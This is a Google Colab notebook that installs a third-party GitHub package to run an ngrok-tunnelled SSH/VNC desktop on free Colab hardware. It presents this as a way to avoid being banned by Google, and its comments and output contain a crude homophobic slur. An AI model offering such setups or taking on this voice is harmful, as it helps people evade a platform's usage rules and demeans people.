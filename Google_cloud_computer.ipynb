{
  "nbformat": 4,
  "nbformat_minor": 0,
  "metadata": {
    "colab": {
      "name": "Google cloud computer",
      "provenance": []
    },
    "kernelspec": {
      "name": "python3",
      "display_name": "Python 3"
    },
    "language_info": {
      "name": "python"
    },
    "widgets": {
      "application/vnd.jupyter.widget-state+json": {
        "41f230ef42494e75bf717f938f5d7074": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "LabelModel",
          "state": {
            "_view_name": "LabelView",
            "style": "IPY_MODEL_d9e6cefebb454df3af0f7c5ea1df674e",
            "_dom_classes": [],
            "description": "",
            "_model_name": "LabelModel",
            "placeholder": "​",
            "_view_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "value": "dpkg-exec: Running dpkg",
            "_view_count": null,
            "_view_module_version": "1.5.0",
            "description_tooltip": null,
            "_model_module": "@jupyter-widgets/controls",
            "layout": "IPY_MODEL_f9eeb3085cee489ca670ca0a26116ea9"
          }
        },
        "d9e6cefebb454df3af0f7c5ea1df674e": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "DescriptionStyleModel",
          "state": {
            "_view_name": "StyleView",
            "_model_name": "DescriptionStyleModel",
            "description_width": "",
            "_view_module": "@jupyter-widgets/base",
            "_model_module_version": "1.5.0",
            "_view_count": null,
            "_view_module_version": "1.2.0",
            "_model_module": "@jupyter-widgets/controls"
          }
        },
        "f9eeb3085cee489ca670ca0a26116ea9": {
          "model_module": "@jupyter-widgets/base",
          "model_name": "LayoutModel",
          "state": {
            "_view_name": "LayoutView",
            "grid_template_rows": null,
            "right": null,
            "justify_content": null,
            "_view_module": "@jupyter-widgets/base",
            "overflow": null,
            "_model_module_version": "1.2.0",
            "_view_count": null,
            "flex_flow": null,
            "width": null,
            "min_width": null,
            "border": null,
            "align_items": null,
            "bottom": null,
            "_model_module": "@jupyter-widgets/base",
            "top": null,
            "grid_column": null,
            "overflow_y": null,
            "overflow_x": null,
            "grid_auto_flow": null,
            "grid_area": null,
            "grid_template_columns": null,
            "flex": null,
            "_model_name": "LayoutModel",
            "justify_items": null,
            "grid_row": null,
            "max_height": null,
            "align_content": null,
            "visibility": null,
            "align_self": null,
            "height": null,
            "min_height": null,
            "padding": null,
            "grid_auto_rows": null,
            "grid_gap": null,
            "max_width": null,
            "order": null,
            "_view_module_version": "1.2.0",
            "grid_template_areas": null,
            "object_position": null,
            "object_fit": null,
            "grid_auto_columns": null,
            "margin": null,
            "display": null,
            "left": null
          }
        },
        "f62fed97f6564b808dc93e9490d01f95": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "FloatProgressModel",
          "state": {
            "_view_name": "ProgressView",
            "style": "IPY_MODEL_173f770295d2408995264dd16f9e2192",
            "_dom_classes": [],
            "description": "",
            "_model_name": "FloatProgressModel",
            "bar_style": "",
            "max": 1,
            "_view_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "value": 0,
            "_view_count": null,
            "_view_module_version": "1.5.0",
            "orientation": "horizontal",
            "min": 0,
            "description_tooltip": null,
            "_model_module": "@jupyter-widgets/controls",
            "layout": "IPY_MODEL_22c45b62529b456589db26767f68a491"
          }
        },
        "173f770295d2408995264dd16f9e2192": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "ProgressStyleModel",
          "state": {
            "_view_name": "StyleView",
            "_model_name": "ProgressStyleModel",
            "description_width": "",
            "_view_module": "@jupyter-widgets/base",
            "_model_module_version": "1.5.0",
            "_view_count": null,
            "_view_module_version": "1.2.0",
            "bar_color": null,
            "_model_module": "@jupyter-widgets/controls"
          }
        },
        "22c45b62529b456589db26767f68a491": {
          "model_module": "@jupyter-widgets/base",
          "model_name": "LayoutModel",
          "state": {
            "_view_name": "LayoutView",
            "grid_template_rows": null,
            "right": null,
            "justify_content": null,
            "_view_module": "@jupyter-widgets/base",
            "overflow": null,
            "_model_module_version": "1.2.0",
            "_view_count": null,
            "flex_flow": null,
            "width": null,
            "min_width": null,
            "border": "1px solid #000e88",
            "align_items": null,
            "bottom": null,
            "_model_module": "@jupyter-widgets/base",
            "top": null,
            "grid_column": null,
            "overflow_y": null,
            "overflow_x": null,
            "grid_auto_flow": null,
            "grid_area": null,
            "grid_template_columns": null,
            "flex": null,
            "_model_name": "LayoutModel",
            "justify_items": null,
            "grid_row": null,
            "max_height": null,
            "align_content": null,
            "visibility": null,
            "align_self": null,
            "height": null,
            "min_height": null,
            "padding": null,
            "grid_auto_rows": null,
            "grid_gap": null,
            "max_width": null,
            "order": null,
            "_view_module_version": "1.2.0",
            "grid_template_areas": null,
            "object_position": null,
            "object_fit": null,
            "grid_auto_columns": null,
            "margin": null,
            "display": null,
            "left": null
          }
        },
        "11fb77a5ae244330a1cb684f418355ce": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "LabelModel",
          "state": {
            "_view_name": "LabelView",
            "style": "IPY_MODEL_3e55df12ccc44f58a607f6f62ccf8af6",
            "_dom_classes": [],
            "description": "",
            "_model_name": "LabelModel",
            "placeholder": "​",
            "_view_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "value": "Reading state information: ",
            "_view_count": null,
            "_view_module_version": "1.5.0",
            "description_tooltip": null,
            "_model_module": "@jupyter-widgets/controls",
            "layout": "IPY_MODEL_c581c536c66e4613a4a4964b889cf2d9"
          }
        },
        "3e55df12ccc44f58a607f6f62ccf8af6": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "DescriptionStyleModel",
          "state": {
            "_view_name": "StyleView",
            "_model_name": "DescriptionStyleModel",
            "description_width": "",
            "_view_module": "@jupyter-widgets/base",
            "_model_module_version": "1.5.0",
            "_view_count": null,
            "_view_module_version": "1.2.0",
            "_model_module": "@jupyter-widgets/controls"
          }
        },
        "c581c536c66e4613a4a4964b889cf2d9": {
          "model_module": "@jupyter-widgets/base",
          "model_name": "LayoutModel",
          "state": {
            "_view_name": "LayoutView",
            "grid_template_rows": null,
            "right": null,
            "justify_content": null,
            "_view_module": "@jupyter-widgets/base",
            "overflow": null,
            "_model_module_version": "1.2.0",
            "_view_count": null,
            "flex_flow": null,
            "width": null,
            "min_width": null,
            "border": null,
            "align_items": null,
            "bottom": null,
            "_model_module": "@jupyter-widgets/base",
            "top": null,
            "grid_column": null,
            "overflow_y": null,
            "overflow_x": null,
            "grid_auto_flow": null,
            "grid_area": null,
            "grid_template_columns": null,
            "flex": null,
            "_model_name": "LayoutModel",
            "justify_items": null,
            "grid_row": null,
            "max_height": null,
            "align_content": null,
            "visibility": null,
            "align_self": null,
            "height": null,
            "min_height": null,
            "padding": null,
            "grid_auto_rows": null,
            "grid_gap": null,
            "max_width": null,
            "order": null,
            "_view_module_version": "1.2.0",
            "grid_template_areas": null,
            "object_position": null,
            "object_fit": null,
            "grid_auto_columns": null,
            "margin": null,
            "display": null,
            "left": null
          }
        },
        "b3993b6e97964840abd5b2de627d38ec": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "FloatProgressModel",
          "state": {
            "_view_name": "ProgressView",
            "style": "IPY_MODEL_f302d037c50e4b61a82d6cd10f46fb4c",
            "_dom_classes": [],
            "description": "",
            "_model_name": "FloatProgressModel",
            "bar_style": "",
            "max": 1,
            "_view_module": "@jupyter-widgets/controls",
            "_model_module_version": "1.5.0",
            "value": 0.0009289886802434921,
            "_view_count": null,
            "_view_module_version": "1.5.0",
            "orientation": "horizontal",
            "min": 0,
            "description_tooltip": null,
            "_model_module": "@jupyter-widgets/controls",
            "layout": "IPY_MODEL_34d3cabdb54045de8af1d0b9f6ef8077"
          }
        },
        "f302d037c50e4b61a82d6cd10f46fb4c": {
          "model_module": "@jupyter-widgets/controls",
          "model_name": "ProgressStyleModel",
          "state": {
            "_view_name": "StyleView",
            "_model_name": "ProgressStyleModel",
            "description_width": "",
            "_view_module": "@jupyter-widgets/base",
            "_model_module_version": "1.5.0",
            "_view_count": null,
            "_view_module_version": "1.2.0",
            "bar_color": null,
            "_model_module": "@jupyter-widgets/controls"
          }
        },
        "34d3cabdb54045de8af1d0b9f6ef8077": {
          "model_module": "@jupyter-widgets/base",
          "model_name": "LayoutModel",
          "state": {
            "_view_name": "LayoutView",
            "grid_template_rows": null,
            "right": null,
            "justify_content": null,
            "_view_module": "@jupyter-widgets/base",
            "overflow": null,
            "_model_module_version": "1.2.0",
            "_view_count": null,
            "flex_flow": null,
            "width": null,
            "min_width": null,
            "border": "1px solid #000e88",
            "align_items": null,
            "bottom": null,
            "_model_module": "@jupyter-widgets/base",
            "top": null,
            "grid_column": null,
            "overflow_y": null,
            "overflow_x": null,
            "grid_auto_flow": null,
            "grid_area": null,
            "grid_template_columns": null,
            "flex": null,
            "_model_name": "LayoutModel",
            "justify_items": null,
            "grid_row": null,
            "max_height": null,
            "align_content": null,
            "visibility": null,
            "align_self": null,
            "height": null,
            "min_height": null,
            "padding": null,
            "grid_auto_rows": null,
            "grid_gap": null,
            "max_width": null,
            "order": null,
            "_view_module_version": "1.2.0",
            "grid_template_areas": null,
            "object_position": null,
            "object_fit": null,
            "grid_auto_columns": null,
            "margin": null,
            "display": null,
            "left": null
          }
        }
      }
    }
  },
  "cells": [
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "-_WgE7HI-I1N"
      },
      "source": [
        "**Use google's server as your computer FOR FREE! (and without getting banned from google)**\n",
        "\n",
        "Requirements\n",
        "\n",
        "1. 5-15 minutes of your time\n",
        "2. A google account (you must have one to run this)\n",
        "3. A ngrok account and authtoken (you can get one here: [press log in with google to log in](https://dashboard.ngrok.com/get-started/your-authtoken))\n",
        "3. VNC Viewer ([get it here](https://www.realvnc.com/download/file/viewer.files/VNC-Viewer-6.21.406-Windows.exe))  and a SSH client (you can use cmd for that)\n",
        "6. AnyDesk for lower latency connection ([download here](https://download.anydesk.com/AnyDesk.exe)) (optional)\n",
        "4. Some experience with Ubuntu (to install apps and do other advanced things) (optional)\n",
        "\n",
        "\n",
        "\n"
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "9JIYz7BCRDsE"
      },
      "source": [
        "**Limitations of google colab cloud computer**\n",
        "\n",
        "The cloud computer will only be able to run for 12 hours at best before resetting so make sure to save your files somewhere else or mount your google drive to save your files.\n",
        "\n",
        "The specs of the cloud computer are: \n",
        "\n",
        "CPU: Intel(R) Xeon(R) CPU @ 2.20GHz (really good btw)\n",
        "\n",
        "Ram: 12 - 16 GB of ram (way more than acceptable)\n",
        "\n",
        "Hard disk space: around 80GB, but no one cares about filling it anyway\n",
        "\n",
        "One of these GPUs: Nvidia K80, T4, P4 or P100. \n",
        "\n",
        "I called these things \"limitations\" but they are insane specs"
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "bBb8sbX7U9G-"
      },
      "source": [
        "**How to use this tool:**\n",
        "\n",
        "Click on the play button on the left side of the code block to start its execution."
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "xTSGAexWVg12"
      },
      "source": [
        "**Let's start!**\n",
        "\n",
        "First, you have to go to the menu above, click on runtime > change runtime type and then change hardware acceleration to GPU. This will be your only chance to use the GPU, if you fail this time, you must run without GPU"
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "bt4przxyVtWT"
      },
      "source": [
        "Secondly, you have to press play on the first and second code block since they are necessary for this to work"
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "-N6zTRPUpC8C",
        "colab": {
          "base_uri": "https://localhost:8080/",
          "height": 1000,
          "referenced_widgets": [
            "41f230ef42494e75bf717f938f5d7074",
            "d9e6cefebb454df3af0f7c5ea1df674e",
            "f9eeb3085cee489ca670ca0a26116ea9",
            "f62fed97f6564b808dc93e9490d01f95",
            "173f770295d2408995264dd16f9e2192",
            "22c45b62529b456589db26767f68a491",
            "11fb77a5ae244330a1cb684f418355ce",
            "3e55df12ccc44f58a607f6f62ccf8af6",
            "c581c536c66e4613a4a4964b889cf2d9",
            "b3993b6e97964840abd5b2de627d38ec",
            "f302d037c50e4b61a82d6cd10f46fb4c",
            "34d3cabdb54045de8af1d0b9f6ef8077"
          ]
        },
        "outputId": "62ee061e-7fd1-4683-d478-f24c368223ee"
      },
      "source": [
        "!pip install git+https://github.com/hogiahien/ColabCloudComputer.git\n",
        "import ColabVPS\n",
        "ColabVPS.setupVNC()\n",
        "#enter your authtoken when it prompts for one, visit this link after logging in to your google account https://dashboard.ngrok.com/get-started/your-authtoken"
      ],
      "execution_count": 2,
      "outputs": [
        {
          "output_type": "stream",
          "text": [
            "Collecting git+https://github.com/hogiahien/ColabCloudComputer.git\n",
            "  Cloning https://github.com/hogiahien/ColabCloudComputer.git to /tmp/pip-req-build-7w7fftre\n",
            "  Running command git clone -q https://github.com/hogiahien/ColabCloudComputer.git /tmp/pip-req-build-7w7fftre\n",
            "Requirement already satisfied (use --upgrade to upgrade): remocolab.py===beta.0.1.69.420 from git+https://github.com/hogiahien/ColabCloudComputer.git in /usr/local/lib/python3.7/dist-packages\n",
            "Requirement already satisfied: pyngrok in /usr/local/lib/python3.7/dist-packages (from remocolab.py===beta.0.1.69.420) (5.0.5)\n",
            "Requirement already satisfied: PyYAML in /usr/local/lib/python3.7/dist-packages (from pyngrok->remocolab.py===beta.0.1.69.420) (3.13)\n",
            "Building wheels for collected packages: remocolab.py\n",
            "  Building wheel for remocolab.py (setup.py) ... \u001b[?25l\u001b[?25hdone\n",
            "  Created wheel for remocolab.py: filename=remocolab.py-beta.0.1.69.420-cp37-none-any.whl size=6847 sha256=da3a6f7744ebcfd1eb24aada5a29419b7a346cc652cda918217dccbbdf1f1e18\n",
            "  Stored in directory: /tmp/pip-ephem-wheel-cache-uh_eiqsq/wheels/89/1f/99/4dd5ca9bbb4f9eb1be323d629a322eee41fccdef274855b0c8\n",
            "Successfully built remocolab.py\n",
            "Oops, there seems to be no GPU available! You can either change runtime type (stated on the textblock above) or ignore this message and press Y to continune\n",
            "Do you want to continue? (don't press no, do the things that I said above instead) [y/n] y\n",
            "---\n",
            "ngrok good argo bad use ngrok instead\n",
            "                     -Hien-\n",
            "yea right use ngrok because argo tunnel is very gay\n",
            "Copy&paste your tunnel authtoken from https://dashboard.ngrok.com/auth\n",
            "(You need to sign up for ngrok and login,)\n",
            "··········\n",
            "Select your ngrok region:\n",
            "us - United States (Ohio)\n",
            "eu - Europe (Frankfurt)\n",
            "ap - Asia/Pacific (Singapore)\n",
            "au - Australia (Sydney)\n",
            "sa - South America (Sao Paulo)\n",
            "jp - Japan (Tokyo)\n",
            "in - India (Mumbai)\n",
            "ap\n"
          ],
          "name": "stdout"
        },
        {
          "output_type": "display_data",
          "data": {
            "application/vnd.jupyter.widget-view+json": {
              "model_id": "41f230ef42494e75bf717f938f5d7074",
              "version_minor": 0,
              "version_major": 2
            },
            "text/plain": [
              "Label(value='')"
            ]
          },
          "metadata": {
            "tags": []
          }
        },
        {
          "output_type": "display_data",
          "data": {
            "application/vnd.jupyter.widget-view+json": {
              "model_id": "f62fed97f6564b808dc93e9490d01f95",
              "version_minor": 0,
              "version_major": 2
            },
            "text/plain": [
              "FloatProgress(value=0.0, layout=Layout(border='1px solid #000e88'), max=1.0)"
            ]
          },
          "metadata": {
            "tags": []
          }
        },
        {
          "output_type": "stream",
          "text": [
            "openssh-server is already installed\n"
          ],
          "name": "stdout"
        },
        {
          "output_type": "display_data",
          "data": {
            "application/vnd.jupyter.widget-view+json": {
              "model_id": "11fb77a5ae244330a1cb684f418355ce",
              "version_minor": 0,
              "version_major": 2
            },
            "text/plain": [
              "Label(value='')"
            ]
          },
          "metadata": {
            "tags": []
          }
        },
        {
          "output_type": "display_data",
          "data": {
            "application/vnd.jupyter.widget-view+json": {
              "model_id": "b3993b6e97964840abd5b2de627d38ec",
              "version_minor": 0,
              "version_major": 2
            },
            "text/plain": [
              "FloatProgress(value=0.0, layout=Layout(border='1px solid #000e88'), max=1.0)"
            ]
          },
          "metadata": {
            "tags": []
          }
        },
        {
          "output_type": "stream",
          "text": [
            "Install xfce4\n",
            "Install xfce4-terminal\n",
            "Install xfce4-goodies\n",
            "Install firefox\n"
          ],
          "name": "stdout"
        },
        {
          "output_type": "error",
          "ename": "KeyError",
          "evalue": "ignored",
          "traceback": [
            "\u001b[0;31m---------------------------------------------------------------------------\u001b[0m",
            "\u001b[0;31mKeyError\u001b[0m                                  Traceback (most recent call last)",
            "\u001b[0;32m/usr/local/lib/python3.7/dist-packages/apt/cache.py\u001b[0m in \u001b[0;36m__getitem__\u001b[0;34m(self, key)\u001b[0m\n\u001b[1;32m    288\u001b[0m         \u001b[0;32mtry\u001b[0m\u001b[0;34m:\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0;32m--> 289\u001b[0;31m             \u001b[0;32mreturn\u001b[0m \u001b[0mself\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0m_weakref\u001b[0m\u001b[0;34m[\u001b[0m\u001b[0mkey\u001b[0m\u001b[0;34m]\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0m\u001b[1;32m    290\u001b[0m         \u001b[0;32mexcept\u001b[0m \u001b[0mKeyError\u001b[0m\u001b[0;34m:\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n",
            "\u001b[0;32m/usr/lib/python3.7/weakref.py\u001b[0m in \u001b[0;36m__getitem__\u001b[0;34m(self, key)\u001b[0m\n\u001b[1;32m    136\u001b[0m             \u001b[0mself\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0m_commit_removals\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0;32m--> 137\u001b[0;31m         \u001b[0mo\u001b[0m \u001b[0;34m=\u001b[0m \u001b[0mself\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mdata\u001b[0m\u001b[0;34m[\u001b[0m\u001b[0mkey\u001b[0m\u001b[0;34m]\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0m\u001b[1;32m    138\u001b[0m         \u001b[0;32mif\u001b[0m \u001b[0mo\u001b[0m \u001b[0;32mis\u001b[0m \u001b[0;32mNone\u001b[0m\u001b[0;34m:\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n",
            "\u001b[0;31mKeyError\u001b[0m: 'elementary-xfce-icon-theme'",
            "\nDuring handling of the above exception, another exception occurred:\n",
            "\u001b[0;31mKeyError\u001b[0m                                  Traceback (most recent call last)",
            "\u001b[0;32m/usr/local/lib/python3.7/dist-packages/apt/cache.py\u001b[0m in \u001b[0;36m__getitem__\u001b[0;34m(self, key)\u001b[0m\n\u001b[1;32m    291\u001b[0m             \u001b[0;32mtry\u001b[0m\u001b[0;34m:\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0;32m--> 292\u001b[0;31m                 \u001b[0mrawpkg\u001b[0m \u001b[0;34m=\u001b[0m \u001b[0mself\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0m_cache\u001b[0m\u001b[0;34m[\u001b[0m\u001b[0mkey\u001b[0m\u001b[0;34m]\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0m\u001b[1;32m    293\u001b[0m             \u001b[0;32mexcept\u001b[0m \u001b[0mKeyError\u001b[0m\u001b[0;34m:\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n",
            "\u001b[0;31mKeyError\u001b[0m: 'elementary-xfce-icon-theme'",
            "\nDuring handling of the above exception, another exception occurred:\n",
            "\u001b[0;31mKeyError\u001b[0m                                  Traceback (most recent call last)",
            "\u001b[0;32m<ipython-input-2-0794c20ef7d3>\u001b[0m in \u001b[0;36m<module>\u001b[0;34m()\u001b[0m\n\u001b[1;32m      1\u001b[0m \u001b[0mget_ipython\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0msystem\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0;34m'pip install git+https://github.com/hogiahien/ColabCloudComputer.git'\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m      2\u001b[0m \u001b[0;32mimport\u001b[0m \u001b[0mColabVPS\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0;32m----> 3\u001b[0;31m \u001b[0mColabVPS\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0msetupVNC\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0m\u001b[1;32m      4\u001b[0m \u001b[0;31m#enter your authtoken when it prompts for one, visit this link after logging in to your google account https://dashboard.ngrok.com/get-started/your-authtoken\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n",
            "\u001b[0;32m/usr/local/lib/python3.7/dist-packages/ColabVPS.py\u001b[0m in \u001b[0;36msetupVNC\u001b[0;34m(ngrok_region, check_gpu_available, tunnel, mount_gdrive_to, mount_gdrive_from, public_key)\u001b[0m\n\u001b[1;32m    415\u001b[0m   \u001b[0mstat\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0mmsg\u001b[0m \u001b[0;34m=\u001b[0m \u001b[0m_setupSSHDMain\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0mngrok_region\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0mpublic_key\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0mtunnel\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0mcheck_gpu_available\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0mmount_gdrive_to\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0mmount_gdrive_from\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0;32mTrue\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m    416\u001b[0m   \u001b[0;32mif\u001b[0m \u001b[0mstat\u001b[0m\u001b[0;34m:\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0;32m--> 417\u001b[0;31m     \u001b[0mmsg\u001b[0m \u001b[0;34m+=\u001b[0m \u001b[0m_setupVNC\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0m\u001b[1;32m    418\u001b[0m \u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m    419\u001b[0m   \u001b[0mprint\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0mmsg\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n",
            "\u001b[0;32m/usr/local/lib/python3.7/dist-packages/ColabVPS.py\u001b[0m in \u001b[0;36m_setupVNC\u001b[0;34m()\u001b[0m\n\u001b[1;32m    361\u001b[0m   \u001b[0mmy_apt\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0minstallDebPackage\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0;34m\"turbovnc.deb\"\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m    362\u001b[0m \u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0;32m--> 363\u001b[0;31m   \u001b[0mmy_apt\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0minstallPkg\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0;34m\"xfce4\"\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0;34m\"xfce4-terminal\"\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0;34m\"xfce4-goodies\"\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0;34m\"firefox\"\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0;34m\"elementary-xfce-icon-theme\"\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0m\u001b[1;32m    364\u001b[0m   \u001b[0mmy_apt\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mcommit\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m    365\u001b[0m   \u001b[0mmy_apt\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mclose\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n",
            "\u001b[0;32m/usr/local/lib/python3.7/dist-packages/ColabVPS.py\u001b[0m in \u001b[0;36minstallPkg\u001b[0;34m(self, *args)\u001b[0m\n\u001b[1;32m     60\u001b[0m   \u001b[0;32mdef\u001b[0m \u001b[0minstallPkg\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0mself\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0;34m*\u001b[0m\u001b[0margs\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m:\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m     61\u001b[0m     \u001b[0;32mfor\u001b[0m \u001b[0mname\u001b[0m \u001b[0;32min\u001b[0m \u001b[0margs\u001b[0m\u001b[0;34m:\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0;32m---> 62\u001b[0;31m       \u001b[0mpkg\u001b[0m \u001b[0;34m=\u001b[0m \u001b[0mself\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0m_cache\u001b[0m\u001b[0;34m[\u001b[0m\u001b[0mname\u001b[0m\u001b[0;34m]\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0m\u001b[1;32m     63\u001b[0m       \u001b[0;32mif\u001b[0m \u001b[0mpkg\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mis_installed\u001b[0m\u001b[0;34m:\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m     64\u001b[0m         \u001b[0mprint\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0;34mf\"{name} is already installed\"\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n",
            "\u001b[0;32m/usr/local/lib/python3.7/dist-packages/apt/cache.py\u001b[0m in \u001b[0;36m__getitem__\u001b[0;34m(self, key)\u001b[0m\n\u001b[1;32m    292\u001b[0m                 \u001b[0mrawpkg\u001b[0m \u001b[0;34m=\u001b[0m \u001b[0mself\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0m_cache\u001b[0m\u001b[0;34m[\u001b[0m\u001b[0mkey\u001b[0m\u001b[0;34m]\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m    293\u001b[0m             \u001b[0;32mexcept\u001b[0m \u001b[0mKeyError\u001b[0m\u001b[0;34m:\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0;32m--> 294\u001b[0;31m                 \u001b[0;32mraise\u001b[0m \u001b[0mKeyError\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0;34m'The cache has no package named %r'\u001b[0m \u001b[0;34m%\u001b[0m \u001b[0mkey\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0m\u001b[1;32m    295\u001b[0m \u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m    296\u001b[0m             \u001b[0;31m# It might be excluded due to not having a version or something\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n",
            "\u001b[0;31mKeyError\u001b[0m: \"The cache has no package named 'elementary-xfce-icon-theme'\""
          ]
        }
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "_nLi-Akcc1hr"
      },
      "source": [
        "Use the VNC password stated above to connect via vnc (don't use the view only one)"
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "nqII3tSraiWU"
      },
      "source": [
        "Start the next code block to change your password, gay's password is your user password (not related to vnc password, you can't change it anyway) (the username is gay, idk why I did this)"
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "1FYAd97AfeKP"
      },
      "source": [
        "#change password because no one can read that auto-generated password\n",
        "!passwd gay"
      ],
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "6mk4EUdrcgWk"
      },
      "source": [
        "Run this to mount google drive folder on the VM (recommended)"
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "KTXaeaYucrL7"
      },
      "source": [
        "from google.colab import drive\n",
        "drive.mount('/content/drive')"
      ],
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "Y_BUmT6IbprR"
      },
      "source": [
        "Install some applications for your computer (for n00bs only)"
      ]
    },
